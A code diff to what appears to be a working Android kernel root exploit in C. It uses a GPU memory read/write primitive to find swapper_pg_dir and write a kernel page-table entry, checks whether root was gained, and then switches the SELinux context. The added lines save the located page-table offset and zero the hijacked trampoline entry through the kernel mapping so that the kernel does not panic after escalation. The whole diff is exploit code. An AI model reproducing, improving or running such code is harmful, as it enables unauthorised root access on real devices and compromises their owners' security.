@@ -350,6 +350,9 @@ const uint64_t gPhyAddrs[] = {0xfebeb000, 0xd0b3b000, 0xbe690000, 0xd5cf0000};
 
 const uint64_t kKernelPageTableEntry = 0x1e0;
 
+// Global to pass swapper_pg_dir offset from setup to main for PTE restore
+static uint64_t g_swapper_pg_dir_off = 0;
+
 int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
 #ifdef DUMP_PAGEMAP
     int pagemap_fd = getuid() == 0? open("/proc/self/pagemap", O_RDONLY|O_CLOEXEC): -1;
@@ -531,6 +534,7 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
     uint64_t swapper_pg_dir_off;
     if (getenv("CHEESE_SWAPPER_PG_DIR_OFF")) {
         swapper_pg_dir_off = strtoull(getenv("CHEESE_SWAPPER_PG_DIR_OFF"), NULL, 0);
+        g_swapper_pg_dir_off = swapper_pg_dir_off;
     } else {
         // there's up to 0xf000 bytes of padding between the end of primary_entry and the start of primary_entry
         // we need to check all 16 places where swapper_pg_dir could be. Do one read of all 16 locations.
@@ -565,6 +569,7 @@ int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
                 uint64_t idmap_pg_dir_off = kernel_entry_file_off - 0xf000 - 0x6000 + i*0x1000;
                 swapper_pg_dir_off = idmap_pg_dir_off + 0x5000;
                 fprintf(stderr, "found CHEESE_SWAPPER_PG_DIR_OFF=0x%lx\n", swapper_pg_dir_off);
+                g_swapper_pg_dir_off = swapper_pg_dir_off;
                 break;
             }
         }
@@ -796,6 +801,19 @@ int main(int argc, char** argv) {
     if (getuid() != 0) {
         fprintf(stderr, "failed to get root - rerun?\n");
         return 1;
+    }
+
+    // RESTORE the trampoline PTE to prevent kernel panic
+    // The PTEs entry at kKernelPageTableEntry was written by GPU.
+    // We now invalidate it via CPU (ksma_mapping still works since PTE is active)
+    {
+        uint64_t target_write_phys = 0xa8000000 + g_swapper_pg_dir_off + (kKernelPageTableEntry * sizeof(uint64_t));
+        uint64_t pte_va = (uint64_t)ksma_mapping - ksma_physical_base + target_write_phys;
+        uint32_t* pte = (uint32_t*)pte_va;
+        uint32_t zero[2] = {0, 0};
+        stupid_memcpy(pte, zero, 8);
+        __builtin___clear_cache(pte, pte + 2);
+        fprintf(stderr, "PTE restored at %lx\n", target_write_phys);
     }
 
     stupid_setexeccon("u:r:shell:s0"); // otherwise binder doesn't work
